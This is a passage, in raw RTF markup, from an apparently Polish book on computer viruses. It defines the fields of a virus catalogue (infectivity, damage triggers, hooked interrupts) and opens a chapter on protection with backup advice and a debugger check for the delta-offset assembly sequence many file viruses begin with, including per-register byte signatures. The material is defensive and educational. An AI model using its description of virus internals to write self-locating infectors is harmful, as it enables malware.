\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TRAC}{\f0\fs24\lang1045{\*\listtag0}E - wirus u\uc1\u380\'bfywa trybu krokowego do odnalezienia oryginalnego wej\uc1\u347\'9ccia do przerwania. }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 2F - wirus u\uc1\u380\'bfywa funkcji (13/2F).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TABLE - wirus u\uc1\u380\'bfywa tablicy z adresami do odnalezienia oryginalnego wej\uc1\u347\'9ccia do przerwania.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SCAN - wirus skanuje pami\uc1\u281\'ea\uc1\u263\'e6 w poszukiwaniu \uc1\u322\'b3a\uc1\u324\'f1}{\f1\fs24\lang1045{\*\listtag0}cucha bajt\'f3w charakterystycznych dla danego przerwania. }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch OTHER - inna metoda.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INFECTIVITY:}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch O - to nie jest wirus.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 1 - wirus, kt\'f3ry do\uc1\u347\'9c\uc1\u263\'e6 wolno si\uc1\u281\'ea rozpowszechnia.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 2 - odpowiada szybko\uc1\u347\'9cci rozmna\uc1\u380\'bfania si\uc1\u281\'ea nierezydentnego wirusa nadpisuj\uc1\u261\'b9cego.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 3 - odpowiada s}{\f0\fs24\lang1045{\*\listtag0}zybko\uc1\u347\'9cci rozmna\uc1\u380\'bfania si\uc1\u281\'ea wirusa nierezydentnego zara\uc1\u380\'bfaj\uc1\u261\'b9cego jeden plik po uruchomieniu.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 4 - odpowiada szybko\uc1\u347\'9cci rozmna\uc1\u380\'bfania si\uc1\u281\'ea wirusa rezydentnego zara\uc1\u380\'bfaj\uc1\u261\'b9cego pliki tylko przy uruchomieniu ofiary.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 5 - szybki infektor.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 6 - odpowada szybko\uc1\u347\'9cci romna\uc1\u380\'bfania si\uc1\u281\'ea wirus\'f3w zara\uc1\u380\'bfaj\uc1\u261\'b9cych MBR.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 7 - bardzo szybki infektor.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch OBVIOUSNESS:}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch okre\uc1\u347\'9cla, jak \uc1\u322\'b3atwo wirus jest zauwa\uc1\u380\'bfalny przez u\uc1\u380\'bfytkownika.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch EXTREMELY - wirus zawiera gro\uc1\u378\'9fny \uc1\u322\'b3adunek, \uc1\u322\'b3atwy do zauwa\uc1\u380\'bfenia.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch QUITE - wirus zawiera \uc1\u322\'b3adunek do\uc1\u347\'9c\uc1\u263\'e6 \uc1\u322\'b3atwy do zauwa\uc1\u380\'bfenia. }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SLIGHTLY - wirus zawiera \uc1\u322\'b3adunek powoduj\uc1\u261\'b9cy efekt trudny do zauwa\uc1\u380\'bfenia.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NONE - wirus nie jest mo\uc1\u380\'bfliwy do zauwa\uc1\u380\'bfenia bez u\uc1\u380\'bfycia specjalnego programu (najcz\uc1\u281\'ea\uc1\u347\'9cciej antywirusowego).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch COMMONNESS:}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch rozpowszechnienie w \uc1\u347\'9cwiecie (pod wzgl\uc1\u281\'eadem ilo\uc1\u347\'9cci zg\uc1\u322\'b3osze\uc1\u324\'f1 infekcj}{\f1\fs24\lang1045{\*\listtag0}i).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 0 - nieznany: najcz\uc1\u281\'ea\uc1\u347\'9cciej trywialny, nadpisuj\uc1\u261\'b9cy, \uc1\u322\'b3atwy do wykrycia.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 1 - bardzo s\uc1\u322\'b3abo znany.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 2 - s\uc1\u322\'b3abo znany (kilka zg\uc1\u322\'b3osze\uc1\u324\'f1).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 3 - znany (przynajmniej jedno zg\uc1\u322\'b3oszenie od znawcy wirus\'f3w).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 4 - znany na ca\uc1\u322\'b3ym \uc1\u347\'9cwiecie.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 5 - bardzo znany.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 6 - bardzo znany w}{\f0\fs24\lang1045{\*\listtag0} przesz\uc1\u322\'b3o\uc1\u347\'9cci.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch COMMONNESS_DATE:}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch okre\uc1\u347\'9cla, kiedy powy\uc1\u380\'bfsze pole by\uc1\u322\'b3o modyfikowane; data zapisywana jest w formacie rrrr-mm-dd.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TRANSIENT_DAMAGE: efekt dzia\uc1\u322\'b3ania wirusa nie jest niszcz\uc1\u261\'b9cy.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch T_DAMAGE  TRIGGER: okre\uc1\u347\'9cla, kiedy powy\uc1\u380\'bfszy efekt zostanie uaktywniony. }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PERMANENT_DAMAGE: okre\uc1\u347\'9cla, jakie zniszczenia mo\uc1\u380\'bfe spowodowa\uc1\u263\'e6 wirus. P_DAMAGE_TRIGGER: okre\uc1\u347\'9cla, kiedy powy\uc1\u380\'bfszy efekt zostanie uaktywniony. SIDE_EFFECTS: znane efekty uboczne powodowane przez wirusa. INFECTION_TRIGGER: okre\uc1\u347\'9cla, kiedy wirus infekuje (np. COM, gdy d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 pliku ofiary > 100 bajt\'f3w).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MSG_DISPLAYED: okre\uc1\u347\'9cla \uc1\u322\'b3a\uc1\u324\'f1cuch (podany w cudzys\uc1\u322\'b3owie) wy\uc1\u347\'9cwietlany przez wirusa;}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch je\uc1\u380\'bfeli zaszyfrowany, nale\uc1\u380\'bfy doda\uc1\u263\'e6 na ko\uc1\u324\'f1cu s\uc1\u322\'b3owo "Encrypted".}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MSG_NOT_DISPLAYED: okre\uc1\u347\'9cla \uc1\u322\'b3a\uc1\u324\'f1cuch (podany w cudzys\uc1\u322\'b3owie) zawarty w wirusie; je\uc1\u380\'bfeli zaszyfrowany, nale\uc1\u380\'bfy doda\uc1\u263\'e6 na ko\uc1\u324\'f1cu s\uc1\u322\'b3owo "Encrypted".}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INTERRUPTS_HOOKED: przedzielona przecinkami lista przerwa\uc1\u324\'f1 i funkcji przej\uc1\u281\'eatych przez wirusa; liczby podane jako HEX.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SELFREC_IN_MEMORY: okre\uc1\u347\'9cla, w jaki spos\'f3b wirus sprawdza, czy jest ju\uc1\u380\'bf zainstalowany w pami\uc1\u281\'eaci.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SELFREC_ON_DISK: okre\uc1\u347\'9cla, w jaki spos\'f3b wirus sprawdza, czy obiekt jest zainfekowany. }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch LIMITATIONS: okre\uc1\u347\'9cla ograniczenia wirusa (hardware, software). }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch COMMENTS: komentarz na temat wirusa. }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ANALYSIS_BY: okre\uc1\u347\'9cla, kto analizowa\uc1\u322\'b3}{\f1\fs24\lang1045{\*\listtag0} wirusa. }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DOCUMENTATION_BY: opisuje, kto sporz\uc1\u261\'b9dzi\uc1\u322\'b3 dokumentacj\uc1\u281\'ea.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ENTRY_DATE: okre\uc1\u347\'9cla dat\uc1\u281\'ea, kiedy baza danych o wirusie zosta\uc1\u322\'b3a stworzona; data ma format: rrrr-mm-dd.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch LAST_MODIFIED: okre\uc1\u347\'9cla dat\uc1\u281\'ea, kiedy baza danych o wirusie by\uc1\u322\'b3a ostatnio modyfikowana; data}{\f1\fs24\lang1045{\*\listtag0} ma format: rrrr-mm-dd.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SEE_ALSO: okre\uc1\u347\'9cla, do jakich wirus\'f3w opisywany wirus jest podobny. }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch END: oznacza koniec opisu wirusa.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch ROZDZIA\uc1\u321\'a3 14}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Najlepsza metoda ustrze\uc1\u380\'bfenia si\uc1\u281\'ea przed wirusami polega na sprawdzaniu nieznanych plik\'f3w (program\'f3w, dokument\'f3w) mo\uc1\u380\'bfliwie najnowszym programem antywirusowym (je\uc1\u380\'bfeli to mo\uc1\u380\'bfliwe, to kilkoma r\'f3\uc1\u380\'bfnymi). Bardzo wa\uc1\u380\'bfnym elementem dzia\uc1\u322\'b3a\uc1\u324\'f1 zapobiegawczych jest tak\uc1\u380\'bfe regularne tworzenie kopii awaryjnych, zawieraj\uc1\u261\'b9cych najwa\uc1\u380\'bfniejsze pliki, b\uc1\u281\'ead\uc1\u261\'b9ce zwykle efektami mozolnej pracy. Cho\uc1\u263\'e6 niekt\'f3rym osobom mo\uc1\u380\'bfe si\uc1\u281\'ea to wyda\uc1\u263\'e6 niepotrzebne, pr\uc1\u281\'eadzej czy p\'f3\uc1\u378\'9fniej kopie te oka\uc1\u380\'bf\uc1\u261\'b9 si\uc1\u281\'ea niezb\uc1\u281\'eadne, i to nie tylko ze wzgl\uc1\u281\'eadu na wirusy. Nie ma bowiem chyba takiego u\uc1\u380\'bfytkownika, kt\'f3remu w pewnym momencie komputer nie odm\'f3wi\uc1\u322\'b3 pos\uc1\u322\'b3usze\uc1\u324\'f1stwa- P\'f3\uc1\u322\'b3 biedy, gdy }{\f1\fs24\lang1045{\*\listtag0}u}{\f0\fs24\lang1045{\*\listtag0}sterka jest trywialna, gorzej, gdy zostanie uszkodzona najwa\uc1\u380\'bfniejsza chyba, poza procesorem, cz\uc1\u281\'ea\uc1\u347\'9c\uc1\u263\'e6 komputera: dysk twardy, W takiej sytuacji kopia awaryjna jest jedyn\uc1\u261\'b9 desk\uc1\u261\'b9 ratunku. Obecno\uc1\u347\'9c\uc1\u263\'e6 wirusa w systemie to nie straszna tragedia, zw\uc1\u322\'b3aszcza, \uc1\u380\'bfe wi\uc1\u281\'eaks}{\f1\fs24\lang1045{\*\listtag0}z}{\f0\fs24\lang1045{\*\listtag0}o\uc1\u347\'9c\uc1\u263\'e6 wirus\'f3w, wbrew powszechnej opinii, nie zawiera procedur destrukcyjnych. W przypadku zainfekowania komputera nie nale\uc1\u380\'bfy wi\uc1\u281\'eac od razu formatowa\uc1\u263\'e6 dysku twardego. Co wi\uc1\u281\'eacej, wykonanie tej operacji wcale nie oznacza pozbycia si\uc1\u281\'ea intruza z systemu. Poni\uc1\u380\'bfej }{\f1\fs24\lang1045{\*\listtag0}z}{\f0\fs24\lang1045{\*\listtag0}amieszczono informacje na temat specyficznych, dzia\uc1\u322\'b3aj\uc1\u261\'b9cych tylko dla wybranych obiekt\'f3w, metod.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 14.1. Ochrona przed wirusami plik\'f3w uruchamialnych}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Opr\'f3cz sprawdzenia programem antywirusowym pliki uruchamial-ne mo\uc1\u380\'bfna dodatkowo pobie\uc1\u380\'bfnie zanalizowa\uc1\u263\'e6 przy u\uc1\u380\'bfyciu debuggera.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wprawny u\uc1\u380\'bfytkownik bowiem cz\uc1\u281\'easto ju\uc1\u380\'bf po kilku, kilkunastu instrukcjach kodu programu rozpozna, czy nie zawiera on wirusa i poprzez przerwanie jego dzia\uc1\u322\'b3ania uniemo\uc1\u380\'bfliwi infekcj\uc1\u281\'ea systemu. Oczywi\uc1\u347\'9ccie powy\uc1\u380\'bfsza metoda wydawa\uc1\u263\'e6 si\uc1\u281\'ea mo\uc1\u380\'bfe bardzo amatorska, jednak jest skuteczna, jak zreszt\uc1\u261\'b9 wi\uc1\u281\'eakszo\uc1\u347\'9c\uc1\u263\'e6 tego typu sposob\'f3w, gdy\uc1\u380\'bf pozwala wykry\uc1\u263\'e6 nowe wirusy, kt\'f3rych nie rozpoznaj\uc1\u261\'b9 jeszcze programy antywirusowa. Na przyk\uc1\u322\'b3ad wykrycie podanej poni\uc1\u380\'bfej sekwencji na pocz\uc1\u261\'b9tku badanego programu \uc1\u347\'9cwiadczy prawie }{\f1\fs24\lang1045{\*\listtag0}n}{\f0\fs24\lang1045{\*\listtag0}a pewno o tym, \uc1\u380\'bfe program ten zawiera wirusa. Jej wykonanie umo\uc1\u380\'bfliwia bowiem uzyskanie relatywnego offsetu, pod kt\'f3rym umieszczony jest w pami\uc1\u281\'eaci kod wirusa. Wyznaczone przemieszczenie jest przez niego stosowane przy dost\uc1\u281\'eapie do zawartych w nim danych (za}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}pomoc\uc1\u261\'b9 adresowania po\uc1\u347\'9credniego: bazowego lub indeksowego).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; Sekwencja znajduj\uc1\u261\'b9ca si\uc1\u281\'ea na pocz\uc1\u261\'b9tku wi\uc1\u281\'eakszo\uc1\u347\'9cci wirus\'f3w plikowych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CALL TRIK            ; wywo\uc1\u322\'b3anie procedury TRIK umie\uc1\u347\'9cci na stosie offset do}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                      ; nast\uc1\u281\'eapuj\uc1\u261\'b9cej po niej instrukcji (POP REJ16) }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TRIK:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch POP REJ16            ; zdejmuje ze stosu offset, pod kt\'f3rym jest umieszczony \tab }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                      ; rozkaz POP REJ16 i umieszcza go w rejestrze 16-bitowym,}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch \tab \tab          ;  najcz\uc1\u281\'ea\uc1\u347\'9cciej w kt\'f3rym\uc1\u347\'9c z : SI, DI, BP, BX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SUB REJ16,????       ;  ???? najcz\uc1\u281\'ea\uc1\u347\'9cciej =3, po tej operacji warto\uc1\u347\'9c\uc1\u263\'e6 REJ16}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                      ; b\uc1\u281\'eadzie ofsetem wskazuj\uc1\u261\'b9cym na pocz\uc1\u261\'b9tek kodu wirusa, \tab }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                      ; warto\uc1\u347\'9c\uc1\u263\'e6 3 wynika z d\uc1\u322\'b3ugo\uc1\u347\'9cci rozkazu CALL TRIK, czyli}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                      ; (OE8h 00h 00h)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Poni\uc1\u380\'bfej podano wygl\uc1\u261\'b9d tej sekwencji dla r\'f3\uc1\u380\'bfnych typ\'f3w rejestru Rejl6.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Sekwencje dla r\'f3\uc1\u380\'bfnych kombinacji rejestru REJ16}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:2.1890in/2.1897in/2.1897in/; table-sdh:89c3728}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx3096\clvertalt\cltxlrtb    \cellx6249\clvertalt\cltxlrtb    \cellx9402
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Rejestr 16-bitowy}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Sekwencja bajt\'f3w}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Kod po deasemblacji}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx3096\clvertalt\cltxlrtb    \cellx6249\clvertalt\cltxlrtb    \cellx9402
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}AX}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}E8 00 00}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 58}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 2D 03 00}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}CALL TRIK}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TRIK: POP AX}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SUB AX,3}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx3096\clvertalt\cltxlrtb    \cellx6249\clvertalt\cltxlrtb    \cellx9402
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}CX}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}E8 00 00}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 59}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 83 E9 03}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}CALL TRIK}{\f1\fs24\lang1045{\*\listtag0}\par}
